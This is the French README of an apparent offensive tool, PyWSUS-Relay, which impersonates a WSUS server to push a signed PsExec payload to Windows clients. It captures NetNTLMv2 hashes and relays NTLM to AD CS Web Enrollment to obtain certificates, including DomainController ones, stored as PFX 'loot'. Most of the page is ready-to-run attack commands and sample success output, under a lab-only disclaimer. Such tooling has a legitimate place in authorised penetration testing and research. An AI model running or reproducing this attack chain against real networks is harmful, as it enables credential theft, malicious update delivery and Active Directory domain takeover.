PyWSUS-Relay

Note publique : cette page présente un outil de recherche et de lab. Les exemples supposent un environnement isolé et autorisé, avec des cibles de test et un payload PE signé Microsoft.

1. Objectif

PyWSUS-Relay part du comportement WSUS-over-HTTP : garder Windows Update Agent en conversation avec un serveur WSUS contrôlé, tout en servant des métadonnées cohérentes et un payload signé Microsoft. Ce fork ajoute une couche d'observation et de relais NTLM pour tester des chemins d'attaque en Active Directory et AD CS sans mélanger l'expérimentation avec une infrastructure de production.

Les ajouts principaux couvrent la capture NetNTLMv2, un relais HTTP minimal, une action de validation AD CS Web Enrollment sur /certsrv/, puis une action d'émission qui soumet un CSR et sauvegarde le PFX obtenu dans un dossier de loot.

2. Installation

Le projet s'installe dans un environnement virtuel Python classique : 

python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

Le payload attendu est un exécutable PE signé Microsoft, par exemple PsExec64.exe.

3. Modes d'exécution

Mode WSUS normal, sans capture ni relais NTLM : 

python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' -v

Capture NTLM avec sortie NetNTLMv2 et journal JSONL : 

python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
  --ntlm-mode capture \
  --hash-file netntlm-captures.txt \
  --json-events wsus-events.jsonl \
  -v

Relais HTTP basique vers une ressource protégée : 

python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
  --ntlm-mode relay-http \
  --relay-target http://target.lab.local/protected/ \
  --relay-action auth-only \
  -v

Validation AD CS Web Enrollment sur /certsrv/ : 

python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
  --ntlm-mode relay-http \
  --relay-target http://ca.lab.local/certsrv/ \
  --relay-action adcs-certsrv \
  --relay-adcs-marker PYWSUS-LAB-ADCS \
  --json-events relay-adcs.jsonl \
  -v

Émission de certificat AD CS avec sauvegarde du PFX : 

python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
  --ntlm-mode relay-http \
  --relay-target http://ca.lab.local/certsrv/ \
  --relay-action adcs-issue \
  --adcs-template Machine \
  --adcs-loot-dir loot \
  -v

Exemple pour un certificat de contrôleur de domaine dans un lab : 

python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
  --ntlm-mode relay-http \
  --relay-target http://192.168.56.102/certsrv/ \
  --relay-action adcs-issue \
  --adcs-template DomainController \
  --adcs-loot-dir loot \
  --json-events issue-adcs-dc.jsonl \
  -v

Un signal de réussite typique ressemble à ceci : 

HTTP relay result  identity=DOMAIN\DC02$ ... authenticated=True validation=type3-and-followup followup=accepted service=adcs-web-enrollment service_validated=True adcs_issued=True cert_id=7 pfx=loot/DOMAIN_DC02.pfx

4. Options utiles

Option Usage
--ntlm-mode Choisit le comportement NTLM : off, challenge-only, capture ou relay-http.
--relay-target Définit l'URL HTTP cible pour le relais.
--relay-action Sélectionne l'action : auth-only, adcs-certsrv ou adcs-issue.
--adcs-template Nom du template à demander lors de l'émission AD CS.
--adcs-alt-name UPN/SAN optionnel pour la demande de certificat.
--adcs-loot-dir Dossier de sauvegarde des artefacts PFX.
--ntlm-session-key Suivi de session par ip ou par connection.
--hash-file / --json-events / --log-file Sorties de capture, événements JSONL et logs texte.
-r HOURS Rotation périodique de session.

Deux touches interactives sont exposées pendant l'exécution : q pour quitter et r pour forcer une rotation de session.

5. Signaux attendus

En capture, l'objectif est de voir arriver un Type 3 NTLM, l'identité machine et l'écriture NetNTLMv2 : 

NTLM Type 3 authenticate received ... identity=DOMAIN\HOST$
HashCapture NetNTLMv2 DOMAIN\HOST$ -> netntlm-captures.txt
GetConfig

Pour la validation AD CS, le résultat attendu confirme l'authentification, le follow-up accepté et la validation du service Web Enrollment : 

HTTP relay result ... authenticated=True validation=type3-and-followup followup=accepted service=adcs-web-enrollment service_validated=True

Pour l'émission, la ligne importante ajoute l'identifiant du certificat et le chemin du PFX sauvegardé : 

HTTP relay result ... adcs_issued=True cert_id=42 pfx=loot/DOMAIN_HOST_.pfx

6. État généré

Le mode par défaut suit les sessions NTLM par IP, adapté aux tests WUA mono-client. Le mode connection est plus strict car il tient compte du couple IP et port source. Les artefacts générés peuvent inclure data/known_clients.json, netntlm-captures.txt, des journaux JSONL optionnels et des PFX dans le dossier de loot.

Le format NetNTLMv2 écrit est user::domain:challenge:nt_proof:client_blob. L'action adcs-certsrv sonde /certsrv/certrqxt.asp, tandis que adcs-issue soumet un CSR puis sauvegarde un PFX. Les résultats JSON de relais peuvent inclure les cookies de la cible et des chemins vers le HTML de debug AD CS quand l'émission échoue.

7. Crédits

PyWSUS-Relay est un fork basé sur les recherches et l'outillage PyWSUS originaux de GoSecure, avec les travaux antérieurs de Paul Stone et Alex Chapman sur les proxy PoC. La série de billets GoSecure sur les attaques WSUS et la documentation MS-WUSP donnent le contexte protocolaire.
